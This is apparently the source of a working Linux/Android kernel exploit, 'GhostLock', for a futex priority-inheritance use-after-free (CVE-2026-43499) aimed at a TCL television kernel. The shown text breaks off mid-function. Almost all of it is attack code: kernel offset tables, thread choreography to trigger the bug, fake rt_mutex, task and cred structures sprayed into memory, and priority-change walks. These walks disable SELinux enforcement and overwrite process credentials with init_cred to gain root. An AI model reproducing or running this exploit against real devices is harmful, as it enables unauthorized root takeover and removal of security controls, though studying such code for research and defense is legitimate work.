/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
 */

#include "common.h"
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <poll.h>
#ifdef __ANDROID__
#include <sys/system_properties.h>
#else
#define PROP_VALUE_MAX 92
static inline int __system_property_get(const char *name, char *value) {
  const char *v = getenv(name);
  if (!v) { value[0] = 0; return 0; }
  size_t n = strlen(v);
  if (n >= PROP_VALUE_MAX) n = PROP_VALUE_MAX - 1;
  memcpy(value, v, n);
  value[n] = 0;
  return (int)n;
}
#endif
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include "tcl_v643/mcast_helper_protocol.h"
#include "tcl_v643/capture_witness.h"
#include "tcl_v643/compat_select_geometry.h"

const struct kernel_offsets *active_offsets = NULL;
/* V643 mode-7 can either use the historical clean NULL store (which also
 * clears selinux_state.initialized) or a one-child store whose pointer bytes
 * keep initialized non-zero while temporarily replacing policycap[0..4].
 * The latter is the only form armed by default on the television and makes
 * a verified live-policy reload mandatory before enforcing is restored. */
static uintptr_t g_selinux_stamp_value;
/* Set only while W2 targets a separate pre-spawned process.  The exploit
 * coordinator must then remain unprivileged; credential normalization is
 * performed later by the victim's ordinary fork(). */
static int g_tcl_external_cred_target;

/* Select symbol, address-space and structure offsets in every translation
 * unit, not just main.c. */
#include "runtime_struct_offsets.h"

static const struct kernel_offsets *find_offsets_for_release(const char *release) {
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(release, known_offsets[i].uname_r) == 0)
      return &known_offsets[i];
  }
  return NULL;
}

/* Read-only profile inspection.  This deliberately does not publish the
 * selected profile through active_offsets and therefore cannot initialize an
 * address conversion or kernel primitive. */
static int print_profile_info(const char *release_override) {
  struct utsname uts;
  const char *release = release_override;
  if (!release) {
    if (uname(&uts) < 0) {
      perror("uname");
      return 1;
    }
    release = uts.release;
  }

  const struct kernel_offsets *profile = find_offsets_for_release(release);
  printf("kernel=%s\n", release);
  if (!profile) {
    printf("profile=missing\n");
    return 1;
  }
  printf("profile=present\n");
  printf("analysis_only=%u\n", profile->analysis_only);
  const char *stack_route = "unknown";
  switch (profile->stack_overlay_route) {
    case GHOST_STACK_OVERLAY_SEQPACKET:
      stack_route = "seqpacket";
      break;
    case GHOST_STACK_OVERLAY_TCL_V643_PSELECT6:
      stack_route = "tcl-v643-pselect6-rejected";
      break;
    case GHOST_STACK_OVERLAY_TCL_V643_MCAST_COMPAT:
      stack_route = "tcl-v643-mcast-arm32-compat";
      break;
    case GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT:
      stack_route = "tcl-v643-newselect-arm32-compat";
      break;
    case GHOST_STACK_OVERLAY_TCL_V65X_NEWSELECT_COMPAT:
      stack_route = "tcl-v65x-newselect-arm32-compat-analysis";
      break;
  }
  printf("stack_overlay_route=%s\n", stack_route);
  const char *reclaim_route = "reference-sabrina";
  if (profile->reclaim_route == GHOST_RECLAIM_TCL_V643_UNPROVEN)
    reclaim_route = "tcl-v643-unproven";
  else if (profile->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT)
    reclaim_route = "tcl-v643-exact";
  else if (profile->reclaim_route == GHOST_RECLAIM_TCL_V65X_UNPROVEN)
    reclaim_route = "tcl-v65x-unproven";
  printf("reclaim_route=%s\n", reclaim_route);
  printf("analysis_blocker=%s\n",
         profile->analysis_blocker ? profile->analysis_blocker : "");
  printf("kimage_text_base=0x%016llx\n",
         (unsigned long long)profile->kimage_text_base);
  printf("phys_offset=0x%016llx\n",
         (unsigned long long)profile->phys_offset);
  printf("page_offset=0x%016llx\n",
         (unsigned long long)profile->page_offset);
  printf("direct_map=0x%016llx..0x%016llx\n",
         (unsigned long long)profile->direct_map_base,
         (unsigned long long)profile->direct_map_end);
  printf("vmemmap_start=0x%016llx\n",
         (unsigned long long)profile->vmemmap_start);
  printf("mm_struct_size=%u\n", profile->mm_struct_size);
  printf("mm_slab_order=%u\n", profile->mm_slab_order);
  printf("slub_min_partial=%u\n", profile->slub_min_partial);
  printf("slub_cpu_partial=%u\n", profile->slub_cpu_partial);
  printf("kernel_phys_load=0x%016llx\n",
         (unsigned long long)profile->kernel_phys_load);
  printf("primitive_arming=%s\n",
         profile->analysis_only ? "REFUSED" : "profile-eligible");
  return 0;
}

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  const char *profile_release = uts.release;
#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
  /* The source-built disposable QEMU kernel omits Android's localversion
   * suffix although it is built from the exact V643 tree/config.  Only the
   * explicitly armed lab target accepts this override. */
  const char *lab_release = getenv("TCL_V643_LAB_RELEASE");
  if (lab_release && lab_release[0]) profile_release = lab_release;
#endif
  const struct kernel_offsets *candidate = find_offsets_for_release(profile_release);
  if (candidate) {
      if (candidate->analysis_only) {
#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
        if (candidate->stack_overlay_route ==
                GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT &&
            candidate->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT) {
          pr_warning("LAB ARMING: accepting integrated TCL V643 profile; "
                     "this build must not be run on the TV before the "
                     "uninstrumented QEMU gate passes\n");
        } else
#endif
        {
        pr_error("profile is analysis-only: %s\n",
                 candidate->analysis_blocker ? candidate->analysis_blocker :
                 "required values are not proven");
        pr_error("refusing to arm any kernel primitive\n");
        return -1;
        }
      }
      active_offsets = candidate;
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      /* Publish per-device symbol addresses that other TUs need. INIT_CRED
       * here expands via the redefined INIT_CRED_OFF above, i.e. the runtime
       * table entry rather than target.h's compile-time constant. */
      g_init_cred_image = INIT_CRED;
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      /* phys_offset=0 is valid (Amlogic S905X3 has RAM at phys 0) */
      if (active_offsets->phys_offset || active_offsets->kernel_phys_load < 0x10000000) {
        p0_phys_offset = active_offsets->phys_offset;
      }
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      return 0;
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_entered;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int ghost_bug_armed;
atomic_int route_in_handler;
atomic_int waiter_futex_returned;
atomic_int consumer_walks_done;
atomic_int consumer_erase_hits;
/* Post-walks_done settle delay (ms) before the main thread's first
 * post-swap syscalls; configured pre-walk via GHOST_SETTLE_MS. */
static int g_settle_ms = 4000;
int g_consumer_nice = 0;
int memfd_leak;

int consumer_nice_headroom(void) {
  return g_consumer_nice < 19;
}

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  /* The overlay-route signal is thread-directed at this thread; make sure
   * it is deliverable here regardless of the creating thread's mask. */
  {
    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGUSR1);
    pthread_sigmask(SIG_UNBLOCK, &set, NULL);
  }
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  {
    errno = 0;
    long wr = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
    int we = errno;
    atomic_store(&waiter_futex_returned, 1);
    printf("[TRIG] waiter WAIT_REQUEUE_PI ret=%ld errno=%d (EDEADLK=%d means bug armed)\n",
           wr, we, wr == -EDEADLK);
  }
  /* Walk-before-cleanup: if the SIGUSR1 handler ran while this futex was
   * interrupted (-ERESTARTNOINTR), the overlay + the consumer's PI walks
   * already happened on this thread's kernel stack, and reaching this
   * point means the restarted futex has already run its ETIMEDOUT
   * cleanup path over the QUIESCED spray page. Only run the route inline
   * in the legacy flow (GHOST_SIGNAL_ROUTE=0, or the signal never came). */
  if (!atomic_load(&route_in_handler))
    do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  /* skip UNLOCK_PI on f_pi_chain in cred modes (6/7) -- the PI state is
   * corrupted and touching it can crash. The owner thread will hang but
   * we don't care. */
  if (!write_mode_is_cred(pselect_custom_write))
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  if (!write_mode_is_cred(pselect_custom_write))
    while (!atomic_load(&owner_chain_done)) usleep(1000);
  /* PARK instead of exiting. In cred mode this task's pi_blocked_on
   * dangles at an rt_mutex_waiter on this thread's kernel stack; the
   * ETIMEDOUT cleanup (REARM'd) survived, but the mid-process thread
   * teardown right after "WAIT_REQUEUE_PI ret=-1 errno=110" panicked
   * the device in roughly half of post-root runs. A sleeping thread is
   * never PI-walked again (no prio changes), its stack keeps the
   * dangling target mapped, and the final exit_group teardown is the
   * path the fully-surviving runs already exercised. */
  for (;;) sleep(1);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  atomic_store(&owner_chain_entered, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

static uintptr_t perf_leak_own_task(void);
uintptr_t g_consumer_task = 0;
void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  /* Consumer perf leak disabled -- causes reclaim failures. */
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    /* Same-page overlay retry (walk-before-cleanup flow): when a previous
     * round quenched the page after landing erase(s), re-arm W0 + the lock
     * tree + fake_task->pi_waiters from the PENDING plan before this
     * round's first walk. The quiesce zeroes the tree roots (they point at
     * the previous overlay's kernel-stack waiter, which is dead data once
     * that sendmsg unwound) and clears W0.pi_tree.rb_right (the write
     * VALUE), so without this re-arm the next walk would hit a NULL
     * prerequeue_top_waiter -> NULL-deref in rt_mutex_dequeue_pi. */
    if (seq >= 2 && write_mode_is_cred(pselect_custom_write) &&
        atomic_load(&consumer_erase_hits) >= 1 &&
        atomic_load(&consumer_erase_hits) < ghost_plan_count()) {
      ghost_apply_next_plan(atomic_load(&consumer_erase_hits) - 1);
    }
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        /* Retarget walk 0 to consumer's real_cred if we have our task */
        if (calls_this_seq == 0 && write_mode_is_cred(pselect_custom_write) &&
            g_consumer_task) {
          uintptr_t cpc = (g_consumer_task + TASK_REAL_CRED_OFF - 8) | 1;
          for (int b2 = 0; ; b2++) {
            uint8_t *pg2 = uring_block(b2);
            if (!pg2) break;
            put64(pg2, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF, cpc);
          }
          char m3[96];
          int n3 = snprintf(m3, sizeof(m3), "[RETARGET] walk 0 -> consumer real_cred %016lx\n",
                            (unsigned long)(g_consumer_task + TASK_REAL_CRED_OFF));
          write(1, m3, n3);
        }
        {
          char m[64];
          int n = snprintf(m, sizeof(m), "[FIRE %d] tid=%d\n", calls_this_seq, tid);
          if (write(1, m, n) < 0) { /* ignore */ }
        }
        errno = 0;
        struct timespec t0, t1;
        clock_gettime(CLOCK_MONOTONIC, &t0);
        /* Monotonic nice ladder across ALL overlay rounds: each call must
         * be a real priority change, else __sched_setscheduler exits early
         * without walking (GATE A), and a decrease would be EPERM (GATE B)
         * and divert to the uncontrolled FUTEX_LOCK_PI fallback walk. */
        int nice = g_consumer_nice + 7;
        if (nice > 19) nice = 19;
        g_consumer_nice = nice;
        {
          int pre_nice = getpriority(PRIO_PROCESS, tid);
          char m[128];
          int n = snprintf(m, sizeof(m), "[NICE] walk %d: %d -> %d\n",
                           calls_this_seq, pre_nice, nice);
          write(1, m, n);
        }
        long sched_ret = sched_setattr_tid(tid, nice);
        /* Check ALL uring payload blocks for walk modification */
        if (write_mode_is_cred(pselect_custom_write)) {
          int found = -1;
          uint64_t expected_armed = *(volatile uint64_t *)(
              (uint8_t *)uring_sqes + W0_OFF +
              FAKE_WAITER_PI_TREE_ENTRY_OFF);
          for (int bi = 0; ; bi++) {
            uint8_t *pg = uring_block(bi);
            if (!pg) break;
            uint64_t pc_i = *(volatile uint64_t *)(
                pg + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF);
            if (pc_i != expected_armed) { found = bi; break; }
          }
          char mc[128];
          int nc2;
          if (found >= 0) {
            uint64_t pc_f = *(volatile uint64_t *)(
                uring_block(found) + W0_OFF +
                FAKE_WAITER_PI_TREE_ENTRY_OFF);
            g_hit_block = found;
            nc2 = snprintf(mc, sizeof(mc), "[WALKCHK %d] FOUND on block %d pc=%016llx\n",
                           calls_this_seq, found, (unsigned long long)pc_f);
            /* Erase-hit oracle: the walk's rb_erase wrote the
             * __rb_clear_node marker (&victim) into W0.pi_tree.pc on the
             * mapping that backs the leaked mm page. Only count a hit when
             * the pre-walk state was the armed plan (not already the
             * marker), so no-op calls can not double-count. */
            if (pc_f == (uint64_t)(page_base + W0_OFF +
                                   FAKE_WAITER_PI_TREE_ENTRY_OFF) &&
                expected_armed != (uint64_t)(page_base + W0_OFF +
                                             FAKE_WAITER_PI_TREE_ENTRY_OFF)) {
              int hits = atomic_fetch_add(&consumer_erase_hits, 1) + 1;
              char hm[96];
              int hn = snprintf(hm, sizeof(hm), "[ERASE %d] rb_erase write landed (hits=%d/%d)\n",
                                calls_this_seq, hits, ghost_plan_count());
              write(1, hm, hn);
            }
          } else {
            nc2 = snprintf(mc, sizeof(mc), "[WALKCHK %d] NOT FOUND in any block (all=%016llx)\n",
                           calls_this_seq, (unsigned long long)expected_armed);
          }
          write(1, mc, nc2);
        }
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long dur_ns = (t1.tv_sec - t0.tv_sec) * 1000000000L + (t1.tv_nsec - t0.tv_nsec);
        {
          char m[96];
          int n = snprintf(m, sizeof(m), "[RET %d] sched_ret=%ld errno=%d dur=%ldus\n",
                          calls_this_seq, sched_ret, errno, dur_ns / 1000);
          if (write(1, m, n) < 0) { /* ignore */ }
        }
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          {
            char m[96];
            int n = snprintf(m, sizeof(m), "[FB %d] fret=%ld\n", calls_this_seq, fret);
            if (write(1, m, n) < 0) { /* ignore */ }
          }
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        /* Each sched_setattr (or its futex fallback) ran one synchronous
         * ghost chain walk. Queue the next write into W0.pi_tree_entry
         * through the SQE mmap for the following walk (if any). */
        ghost_apply_next_plan(calls_this_seq);
        /* Dump map 64's W0 state after re-arm */
        if (write_mode_is_cred(pselect_custom_write) && calls_this_seq == 0 &&
            uring_count > 64) {
          uint8_t *m64 = (uint8_t *)uring_maps[64];
          uint32_t w0_prio = *(uint32_t *)(m64 + W0_OFF + FAKE_WAITER_PRIO_OFF);
          uint64_t w0_pc = *(uint64_t *)(m64 + W0_OFF +
                                        FAKE_WAITER_PI_TREE_ENTRY_OFF);
          uint64_t lk_root = *(uint64_t *)(m64 + LOCK_OFF + RT_MUTEX_WAITERS_OFF);
          uint64_t lk_left = *(uint64_t *)(m64 + LOCK_OFF +
                                          RT_MUTEX_WAITERS_OFF + 8);
          uint64_t pi_root = *(uint64_t *)(m64 + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF);
          char dm[192];
          int dn = snprintf(dm, sizeof(dm),
            "[REARM64] W0.prio=%u pc=%016llx lk.root=%016llx lk.left=%016llx pi.root=%016llx\n",
            w0_prio, (unsigned long long)w0_pc,
            (unsigned long long)lk_root, (unsigned long long)lk_left,
            (unsigned long long)pi_root);
          write(1, dm, dn);
        }
        calls_this_seq++;
        // ponytail: 1 walk per overlay round -- waiter_update_prio clamps CAL_PRIO to 120, blocking walk 1's oracle
        int round_budget = g_write_plans_active ? 1 : ghost_plan_count();
        if (calls_this_seq >= round_budget) {
          atomic_store(&punch_consume_go, 0);
          /* Quiesce the spray page before the waiter's futex return path
           * walks it while holding hb->lock. Clear all tree roots, lock
           * fields, and owner so cleanup_proxy_lock sees empty trees. */
          if (write_mode_is_cred(pselect_custom_write)) {
            /* Full quiesce: release spinlocks, clear trees, repair uid.
             * The waiter thread spins on page spinlock words (wait_lock
             * and/or pi_lock) held by the walk. Zero them to release.
             * Patch EVERY 16KB payload block (multi-order spectrum
             * mappings carry one payload copy per block). */
            for (int b = 0; ; b++) {
              uint8_t *pg = uring_block(b);
              if (!pg) break;
              /* Release spinlocks FIRST (breaks the spin) */
              *(volatile uint32_t *)(pg + LOCK_OFF) = 0;                    /* wait_lock */
              *(volatile uint32_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF) = 0; /* pi_lock */
              /* NULL W0 children */
              *(volatile uint64_t *)(pg + W0_OFF + 0x08) = 0;
              *(volatile uint64_t *)(pg + W0_OFF + 0x10) = 0;
              *(volatile uint64_t *)(pg + W0_OFF +
                                     FAKE_WAITER_PI_TREE_ENTRY_OFF + 8) = 0;
              *(volatile uint64_t *)(pg + W0_OFF +
                                     FAKE_WAITER_PI_TREE_ENTRY_OFF + 16) = 0;
              /* Clean tree roots + owner */
              *(volatile uint64_t *)(pg + LOCK_OFF + RT_MUTEX_WAITERS_OFF) = 0;
              *(volatile uint64_t *)(pg + LOCK_OFF +
                                     RT_MUTEX_WAITERS_OFF + 8) = 0;
              *(volatile uint64_t *)(pg + LOCK_OFF + RT_MUTEX_OWNER_OFF) = 0;
              *(volatile uint64_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF) = 0;
              *(volatile uint64_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8) = 0;
              /* Repair uid/gid */
              *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_UID_OFF) = 0;
              *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_GID_OFF) = 0;
            }
            __atomic_thread_fence(__ATOMIC_SEQ_CST);
            *(volatile uint32_t *)&f_pi_target = 0;
            *(volatile uint32_t *)&f_pi_chain = 0;
            *(volatile uint32_t *)&f_wait = 0;
            __atomic_thread_fence(__ATOMIC_SEQ_CST);
            /* Write main thread's procfs uid to file and exit immediately.
             * Don't wait -- the main thread is stuck from CPU saturation. */
            {
              char sp[64], sb[512], ob[256];
              pid_t mp = getpid();
              snprintf(sp, sizeof(sp), "/proc/%d/task/%d/status", mp, mp);
              int sf = open(sp, O_RDONLY);
              if (sf >= 0) {
                int n = read(sf, sb, sizeof(sb)-1);
                close(sf);
                if (n > 0) {
                  sb[n] = 0;
                  char *u = strstr(sb, "Uid:");
                  if (u) { char *nl = strchr(u, '\n'); if (nl) *nl = 0; }
                  int ol2 = snprintf(ob, sizeof(ob), "[+] main: %s\n", u ? u : "?");
                  write(1, ob, ol2);
                  int mf = open("/data/local/tmp/.ghostlock_root",
                                O_WRONLY|O_CREAT|O_TRUNC|O_SYNC, 0644);
                  if (mf >= 0) { write(mf, ob, ol2); fsync(mf); close(mf); }
                }
              }
            }
            /* SELinux-off verification (mode 7): this consumer thread has a
             * normal SELinux context and can read selinuxfs from the start,
             * so after each round we can prove whether the zero-write landed:
             * enforcing="0" right after an erase hit on plan 0 means the
             * selinux_state address (kaslr + off_selinux_enforcing) was
             * correct. Read via raw syscalls for consistency with the
             * post-walk environment (consumer libc works, but keep the
             * wedge-path raw). */
            if (pselect_custom_write == WRITE_MODE_CRED_SELINUX) {
              long ef = syscall(__NR_openat, AT_FDCWD,
                                "/sys/fs/selinux/enforce", O_RDONLY, 0);
              if (ef >= 0) {
                char eb[16];
                long en = syscall(__NR_read, ef, eb, sizeof(eb) - 1);
                syscall(__NR_close, ef);
                int eoff = (en > 0 && eb[0] == '0');
                if (eoff) g_selinux_off = 1;
                char em[128];
                int el = snprintf(em, sizeof(em),
                    "[SELINUX] enforce=%c after %d walk(s)%s\n",
                    en > 0 ? eb[0] : '?',
                    atomic_load(&consumer_erase_hits),
                    eoff ? " - SELinux OFF, write landed" : "");
                write(1, em, el);
              }
            }
            /* Publish completion only when this route can contribute
             * nothing more: every planned erase landed, or the nice ladder
             * is exhausted (no further sched_setattr can produce a real
             * priority change -> no further walk can ever fire). If erases
             * are still pending, stay alive: the route's next overlay
             * round (a fresh sendmsg re-writes waiter->prio=CAL_PRIO, and
             * the monotonic ladder supplies the priority change) re-fires
             * the pending plan. The main thread waits for this flag (plus
             * its erase-count bound) before it exec()s, so the exec can
             * never kill the consumer mid-walk. */
            if (atomic_load(&consumer_erase_hits) >= ghost_plan_count() ||
                !consumer_nice_headroom()) {
              atomic_store(&consumer_walks_done, 1);
              { static const char cd[] = "[DBG] consumer: walks_done=1 set\n";
                write(1, cd, sizeof(cd) - 1); }
              /* Stop the consumer for good: no further walks may fire
               * after this point -- the waiter's futex restarts once the
               * handler returns and re-initializes the rt_mutex_waiter
               * that the dangling pi_blocked_on points at. */
              atomic_store(&punch_consume_stop, 1);
            }
            /* Don't exit -- let the main thread handle exec. */
          }
          break;
        }
      }
    }
  }
  /* PARK instead of exiting: mid-process teardown of the pinned consumer
   * right after the final walk raced the kernel's PI-state quiesce and
   * panicked the device post-root (same crash window as the waiter's
   * teardown). A sleeping pinned thread triggers no PI walks. */
  for (;;) sleep(1);
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_entered, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  atomic_store(&ghost_bug_armed, 0);
  atomic_store(&route_in_handler, 0);
  atomic_store(&waiter_futex_returned, 0);
  atomic_store(&consumer_walks_done, 0);
  atomic_store(&consumer_erase_hits, 0);
  g_consumer_nice = 0;
  cfi_last_step = 0; cfi_last_errno = 0;
}

/* Exact V643 stack carrier: an AArch32 helper owns the stale waiter while
 * this AArch64 coordinator owns the PI-cycle owner and priority-change
 * consumer.  One helper lifetime is intentionally limited to one rb_erase.
 * QEMU showed that a second walk over the residual waiter is not stable. */
struct tcl_split_run {
  struct tcl_v643_mcast_shared *shared;
  pid_t helper_pid;
};

/* The first TCL write keeps the proven 50 ms timing. Same-page reuse may
 * increase this after a clean carrier miss; it never starts another reclaim. */
static int g_tcl_split_settle_usec = 50000;

extern int g_route_write_ok;
extern int g_selinux_off;
extern int g_hit_block;

static int wait_atomic_nonzero(_Atomic uint32_t *word, int timeout_ms) {
  for (int i = 0; i < timeout_ms; i++) {
    if (atomic_load_explicit(word, memory_order_acquire)) return 1;
    usleep(1000);
  }
  return 0;
}

static void tcl_quiesce_payload(void) {
  for (int b = 0; ; b++) {
    uint8_t *pg = uring_block(b);
    if (!pg) break;
    *(volatile uint32_t *)(pg + LOCK_OFF) = 0;
    *(volatile uint32_t *)(pg + FAKE_TASK_OFF +
                           FAKE_TASK_PI_LOCK_OFF) = 0;
    *(volatile uint64_t *)(pg + W0_OFF + 0x08) = 0;
    *(volatile uint64_t *)(pg + W0_OFF + 0x10) = 0;
    *(volatile uint64_t *)(pg + W0_OFF +
                           FAKE_WAITER_PI_TREE_ENTRY_OFF + 8) = 0;
    *(volatile uint64_t *)(pg + W0_OFF +
                           FAKE_WAITER_PI_TREE_ENTRY_OFF + 16) = 0;
    *(volatile uint64_t *)(pg + LOCK_OFF + RT_MUTEX_WAITERS_OFF) = 0;
    *(volatile uint64_t *)(pg + LOCK_OFF + RT_MUTEX_WAITERS_OFF + 8) = 0;
    *(volatile uint64_t *)(pg + LOCK_OFF + RT_MUTEX_OWNER_OFF) = 0;
    *(volatile uint64_t *)(pg + FAKE_TASK_OFF +
                           FAKE_TASK_PI_WAITERS_OFF) = 0;
    *(volatile uint64_t *)(pg + FAKE_TASK_OFF +
                           FAKE_TASK_PI_WAITERS_OFF + 8) = 0;
    *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_USAGE_OFF) = 0x100;
    *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_UID_OFF) = 0;
    *(volatile uint32_t *)(pg + FAKE_CRED_OFF + CRED15_GID_OFF) = 0;
  }
  atomic_thread_fence(memory_order_seq_cst);
}

static void *tcl_split_owner(void *opaque) {
  struct tcl_split_run *run = opaque;
  struct tcl_v643_mcast_shared *s = run->shared;
  disable_rseq_for_thread();
  if (access("/dev/glqemu-root", F_OK) == 0)
    (void)prctl(PR_SET_NAME, "glqemu-owner", 0, 0, 0);
  else
    (void)prctl(PR_SET_NAME, "tcl_gl_owner", 0, 0, 0);
  atomic_store_explicit(&s->owner_tid, (uint32_t)syscall(__NR_gettid),
                        memory_order_release);
  if (futex_op(&s->f_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    atomic_fetch_add(&s->failures, 1);
    return NULL;
  }
  while (!atomic_load(&s->waiter_ready)) sched_yield();
  atomic_store(&s->owner_started, 1);
  struct timespec deadline;
  clock_gettime(CLOCK_REALTIME, &deadline);
  deadline.tv_sec += 2;
  errno = 0;
  long owner_ret = futex_op(&s->f_chain, FUTEX_LOCK_PI, 0,
                            &deadline, NULL, 0);
  s->diag_owner_ret = (int32_t)owner_ret;
  s->diag_owner_errno = errno;
  if (owner_ret != -1 || errno != ETIMEDOUT)
    atomic_fetch_add(&s->failures, 1);
  atomic_store_explicit(&s->owner_abort_done, 1, memory_order_release);
  if (owner_ret == 0)
    (void)futex_op(&s->f_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  (void)futex_op(&s->f_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

/* Last userspace fail-closed check before the priority change enters the PI
 * chain.  This cannot inspect the stale on-stack waiter, but it prevents a
 * partially re-armed reclaimed page from reaching rt_mutex_top_waiter(). */
static int tcl_validate_captured_w0(void) {
  uint8_t *pg = uring_block(g_tcl_capture_block);
  if (!pg) {
    pr_error("TCL prefire: captured block %d is not mapped\n",
             g_tcl_capture_block);
    return 0;
  }

  uint64_t lock_root = *(volatile uint64_t *)(
      pg + LOCK_OFF + RT_MUTEX_WAITERS_OFF);
  uint64_t lock_left = *(volatile uint64_t *)(
      pg + LOCK_OFF + RT_MUTEX_WAITERS_OFF + 8);
  uint64_t lock_owner = *(volatile uint64_t *)(
      pg + LOCK_OFF + RT_MUTEX_OWNER_OFF);
  uint64_t w0_parent = *(volatile uint64_t *)(pg + W0_OFF + 0x00);
  uint64_t w0_right = *(volatile uint64_t *)(pg + W0_OFF + 0x08);
  uint64_t w0_left = *(volatile uint64_t *)(pg + W0_OFF + 0x10);
  uint64_t w0_task = *(volatile uint64_t *)(
      pg + W0_OFF + FAKE_WAITER_TASK_OFF);
